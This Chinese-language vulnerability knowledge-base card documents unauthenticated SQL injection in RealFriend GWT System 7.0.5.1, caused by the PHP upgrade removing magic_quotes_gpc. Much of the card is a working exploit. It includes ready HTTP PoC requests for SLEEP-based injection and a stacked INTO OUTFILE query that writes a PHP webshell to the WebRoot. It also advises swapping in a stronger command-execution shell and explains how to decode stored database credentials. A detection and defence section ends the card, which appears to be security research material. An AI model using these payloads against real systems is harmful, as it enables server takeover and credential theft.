---
id: web-generic-sqli-ruiyou-tianyi-php54-appsave-appdel-outfile-webshell
title: 瑞友天翼 7.0.5.1 PHP 升级致 magic_quotes 失效：appsave/appdel GET 注入与 INTO OUTFILE 写 WebShell
type: scenario
domain: web
path: web/generic/sqli
technique: ruijou-php54-magic-quotes-regression-sqli-outfile
aliases:
- 瑞友天翼 appsave SQL 注入
- 瑞友天翼 appdel SQL 注入
- hmrao.php s=/Admin/appsave
- magic_quotes_gpc 升级失效
- PHP 5.4 注入复活
- GWT System SQL 注入
- RealFriend SQL 注入
tags:
- web
- sqli
- php
- into-outfile
- webshell
- windows
- ruijou
- thinkphp
- magic-quotes
- rce
cve: []
severity: high
confidence: high
affected_versions: 7.0.5.1（原文复现，PHP 5.6.40）；7.0.3.1（PHP 5.3.5）单引号仍被转义、未复现成功
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V421
  verified_at: '2026-11-09T16:30:51+08:00'
  notes: '已对照原文与全部20张图核对：7.0.3.1/PHP5.3.5 单引号被转义（图13）与 7.0.5.1/PHP5.6.40 不转义（图11/14-16）、MAGIC_QUOTES_GPC 兼容代码（图12）、appsave appid 直拼 getLastSql 回显（图08/09）、appdel list 双 DELETE 各 SLEEP(5) 共约10s（图18-20）、INTO OUTFILE 写 WebRoot\test.php（图17）均与原文一致；CasDbCnn.dat #→= Base64 解码说明与图01一致。affected_versions 与原文明确复现版本一致，保留。与同产品 AgentBoard.XGI UNION 注入卡入口/版本/根因不同，dedup_review 理由成立。原文本地复现完整，未在本机复跑。'
---

## 一句话结论

瑞友天翼应用虚拟化系统（GWT System）7.0.5.1 将 PHP 从 5.3.5 升级到 5.6.40，而 magic_quotes_gpc 自 PHP 5.4 起被移除，遗留代码依赖的「GPC 自动转义」防护随之消失；未授权的 `/hmrao.php?s=/Admin/appsave`（`appid`）与 `/Admin/appdel`（`list`）GET 参数恢复可注入，配合 `getLastSql()` 回显与 `SLEEP()` 盲注确认后，在 MySQL `secure_file_priv=''` 下用堆叠查询 `INTO OUTFILE` 把 PHP 代码写入 WebRoot，访问即获得服务器 RCE。

## 原理

- **版本升级引入的防护回归**：magic_quotes_gpc 在 PHP 5.3 标记废弃、5.4.0 正式移除；开启时它会自动给 GET/POST/COOKIE 数据中的单引号、双引号、反斜杠等加反斜杠。旧版瑞友天翼在处理输入时依赖这一层运行时转义，即使业务代码把参数直接拼进 SQL，引号也会先被转义而无法闭合字符串。代码中的兼容判断也体现了这一点：`version_compare(PHP_VERSION,'5.4.0','<')` 成立时根据 `get_magic_quotes_gpc()` 定义 `MAGIC_QUOTES_GPC`，否则直接定义为 `false`。升级到 PHP 5.6.40 后常量恒为 false，原先的「兜底转义」不再存在。
- **7.0.3.1 vs 7.0.5.1 的行为差异**：7.0.3.1 运行 PHP 5.3.5，注入 `appid=3'` 时回显 SQL 为 `WHERE (app_id='3\'')`，单引号被转义；7.0.5.1 运行 PHP 5.6.40，同一请求回显 `WHERE (app_id='3')` 并可闭合，证明转义层已缺失。原文推断旧版曾通过开启 magic_quotes_gpc 缓解历史 SQL 注入，PHP 升级让这层缓解失效，注入随之「复活」。
- **注入点 1：appsave**：控制器 `appsave()`（新建/编辑应用保存）中 `$app->where("app_id='{$_GET['appid']}'")->Data($Data)->save();` 把 GET 参数直接拼接进 ThinkPHP 的 where 条件；且 `if (!$this->adminchecklogin()) return;` 被注释，接口无需登录。`echo $app->getLastSql();` 会把最近执行的 SQL 回显在 JSON 响应中，既可确认注入，也便于构造闭合。
- **注入点 2：appdel**：`appdel()` 先 `$reqList = explode(',', $_GET['list']);`，再在循环里拼出 `$condition = "app_id='{$item}'"` 与 `$conditionAppServer = "AppId = ('{$item}')"`，分别用于 `app_server` 和 `application` 两张表的 `where()->delete()`；`adminchecklogin()` 同样被注释。由于同一 payload 会被用于两条 DELETE，`SLEEP(5)` 会累计约 10 秒，形成明显的时间盲注特征。
- **写文件条件**：集成/默认 MySQL 环境常以 DBA 权限运行，`secure_file_priv=''` 表示允许 `INTO OUTFILE` 写入任意目录；WebRoot 固定为 `C:\Program Files (x86)\RealFriend\Rap Server\WebRoot`，Apache + PHP 会解析其中的 `.php` 文件。堆叠查询 `UPDATE ...; select '<?php phpinfo();?>' into outfile '...\WebRoot\test.php'-- ` 把代码写入 Web 根后，访问即可执行。
- **辅助信息**：`RAPAgent.XGI?CMD=GetRegInfo` 与 `CASMain.XGI?cmd=About` 可直接读取版本（如 `Version=7.0.5.1`）；数据库配置文件位于 `C:\Program Files (x86)\RealFriend\Rap Server\data\Config\CasDbCnn.dat`，其中口令把 Base64 的 `=` 填充替换为 `#`，把 `#` 换回 `=` 再 Base64 解码即可得到数据库账号口令（如 `YWRtaW4#` → `admin`），可用于连接 MySQL 确认 `FILE` 权限与 `secure_file_priv`。

## 触发条件

- 目标为瑞友天翼应用虚拟化系统 7.0.5.1（或同代 PHP ≥5.4 构建），`/hmrao.php` 的 `s=/Admin/appsave`、`s=/Admin/appdel` 路由可从网络访问。
- 两个接口的登录校验被注释/失效，GET 参数 `appid`、`list` 未参数化即拼入 SQL。
- MySQL 账号具备 `FILE` 权限且 `secure_file_priv` 允许写入 WebRoot（为空或包含该路径），MySQL 进程对 WebRoot 可写；Web 服务解析 `.php`。
- 攻击者能访问写入后的 webshell 路径（同主机 80/443）。
- 若目标仍是 PHP <5.4 构建（如 7.0.3.1 + PHP 5.3.5），magic_quotes_gpc 会转义引号，本方法不成立，需要其它绕过。

## 利用步骤

1. 识别版本：访问 `http://<target>/RAPAgent.XGI?CMD=GetRegInfo` 与 `http://<target>/CASMain.XGI?cmd=About`，或读取 `/phpinfo.php` 确认产品版本与 PHP 版本（7.0.5.1 ↔ PHP 5.6.40）。
2. 探测转义：向 `appsave` 发送 `appid=3'`，观察 JSON 中 `getLastSql()` 回显的 SQL；若引号未被反斜杠转义（`WHERE (app_id='3')`），说明 magic_quotes 防护已不在。
3. 确认注入：发送闭合 payload 如 `appid=3%27%29--+`，SQL 正常闭合；再用 `appid=3%27%29%3b+select+sleep(5)--+` 观察响应延迟约 5 秒；`appdel` 的 `list=1')%20AND(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)AND('1` 因两条 DELETE 可延迟约 10 秒。
4. 确认文件写权限：若能读取 `CasDbCnn.dat`，按 `#`→`=`、Base64 解码取得数据库账号口令，连接 MySQL 执行 `show global variables like '%secure%';`，确认 `secure_file_priv` 为空（可写任意目录）。
5. 写 WebShell：向 appsave 发送堆叠 payload：
   `GET /hmrao.php?s=/Admin/appsave&appid=1%27);select%20'<?php%20phpinfo();?>'%20into%20outfile%20'C:\\Program%20Files%20(x86)\\RealFriend\\Rap%20Server\\WebRoot\\test.php'--+`
   响应 SQL 回显中可见 `select ... into outfile ...` 已执行。
6. 访问 `http://<target>/test.php` 验证 PHP 执行；替换为更强的一句话/命令执行 webshell，按授权范围清理。

## PoC

```http
GET /RAPAgent.XGI?CMD=GetRegInfo HTTP/1.1
Host: <target>
# → Reg=NOReg User=... Version=7.0.5.1 Production=标准版
```

```http
GET /phpinfo.php HTTP/1.1
Host: <target>
# → 7.0.5.1 / PHP Version 5.6.40
```

```http
GET /hmrao.php?s=/Admin/appsave&appid=3%27 HTTP/1.1
Host: <target>
# 7.0.5.1 响应回显：UPDATE `application` SET `name`='', `description`='' WHERE (app_id='3')
# 7.0.3.1 同请求回显：... WHERE (app_id='3\')  ← 单引号仍被转义

GET /hmrao.php?s=/Admin/appsave&appid=3%27%29%3b+select+sleep(5)--+ HTTP/1.1
Host: <target>
# 响应约 5 秒后返回，确认堆叠/时间注入

GET /hmrao.php?s=/Admin/appdel&list=1%27)%20AND(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)AND(%271 HTTP/1.1
Host: <target>
# 两条 DELETE 各执行 SLEEP(5)，响应约 10 秒

GET /hmrao.php?s=/Admin/appsave&appid=1%27);select%20%27%3C?php%20phpinfo();?%3E%27%20into%20outfile%20%27C:\\Program%20Files%20(x86)\\RealFriend\\Rap%20Server\\WebRoot\\test.php%27--+ HTTP/1.1
Host: <target>
# 随后访问 http://<target>/test.php
```

```text
# CasDbCnn.dat 中 DSUID/DSPSW/DCDB 等值把结尾 # 换回 = 后 Base64 解码
YWRtaW4#  → admin
```

说明：原文在 7.0.5.1 环境完整复现了 SQL 回显、SLEEP 盲注与 OUTFILE 写文件；本卡未在本地复跑，写入后的 test.php 访问效果原文未给截图。

## 变体与关联

- **同产品不同入口**：[[web-generic-sqli-ruiyou-tianyi-agentboard-xgi-union-outfile-webshell]]（`AgentBoard.XGI` 的 `user` 参数 UNION + INTO OUTFILE，旧版本路线），与本卡 appsave/appdel 的 GET 拼接注入是不同注入点，可互为备选。
- **根因模式**：PHP 5.4 移除 magic_quotes_gpc 后，任何依赖「GPC 自动转义」兜底的遗留应用都会重新暴露注入；升级 PHP 前应做安全回归测试。反向场景（PHP 5.2 魔术引号开启时写马被转义）见 [[web-php-rce-magic-quotes-stripslashes-webshell-write-bypass]]。
- **SQL 报错回显**：ThinkPHP 的 `getLastSql()` 被直接 echo 到响应，既泄露 SQL 结构也帮助攻击者构造闭合；生产环境应关闭调试输出。
- **同类写文件**：MySQL `INTO OUTFILE` 写 Web 根是经典 RCE 路径，前提是 `FILE` 权限与 `secure_file_priv` 允许。
- **盲注特征**：appdel 的双 DELETE 结构使 `SLEEP(5)` 表现为约 10 秒，可作为识别该注入点的指纹。

## 检测与防御

- **根除注入**：所有 SQL 使用参数化查询/ORM 绑定，禁止把 `$_GET` 直接拼入 `where()`；`appid`、`list` 等参数做类型与白名单校验（`list` 应校验为数字 ID 列表）。
- **恢复鉴权**：appsave/appdel 的 `adminchecklogin()` 不应被注释，管理接口必须登录且做权限校验；对 `/hmrao.php?s=/Admin/*` 增加统一拦截。
- **关闭回显**：生产环境关闭 `getLastSql()` 等调试输出，避免 SQL 结构泄露；统一异常处理不返回数据库错误。
- **数据库降权**：Web 业务库账号不要使用 DBA，撤销 `FILE` 权限；设置 `secure_file_priv` 指向受控目录；WebRoot 不要对数据库进程可写。
- **PHP 升级回归**：从 PHP 5.3/5.2 升级到 5.4+ 时，全面排查依赖 magic_quotes_gpc、`get_magic_quotes_gpc()`、`MAGIC_QUOTES_GPC` 常量的代码路径，改用显式转义/参数化，不能把运行时魔术引号当安全边界。
- **检测**：WAF 拦截 `hmrao.php` 参数中的引号、`sleep(`、`into outfile`、堆叠分号；监控响应体出现 SQL 语句、响应时间异常（5/10 秒）；WebRoot 文件完整性监控新增 `.php`；MySQL 审计 `SELECT ... INTO OUTFILE` 与 `FILE` 权限使用。
